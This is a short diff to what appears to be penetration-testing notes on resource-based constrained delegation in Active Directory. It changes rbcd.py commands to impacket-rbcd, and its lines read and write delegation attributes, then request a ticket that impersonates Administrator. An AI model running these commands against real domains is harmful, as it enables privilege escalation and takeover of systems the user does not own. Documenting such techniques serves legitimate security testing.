@@ -16,9 +16,9 @@
 
 #### 3) rbcd.py
 
- - rbcd.py -delegate-to 'TARGET$' -dc-ip 'DC' -action 'read' 'domain'/'USER':'PASSWORD' (Try to read the attribute)
+ - impacket-rbcd -delegate-to 'TARGET$' -dc-ip 'DC' -action 'read' 'domain'/'USER':'PASSWORD' (Try to read the attribute)
 
- - rbcd.py -delegate-from 'COMPUTER$' -delegate-to 'TARGET$' -dc-ip 'DC' -action 'write' DOMAIN/USER:PASSWORD
+ - impacket-rbcd -delegate-from 'COMPUTER$' -delegate-to 'TARGET$' -dc-ip 'DC' -action 'write' DOMAIN/USER:PASSWORD
 
  - getST.py -spn host/DC_FQDN 'DOMAIN/COMPUTER_ACCOUNT:COMPUTER_PASS' -impersonate Administrator --dc-ip DC_IP (Get TGT ticket)
 
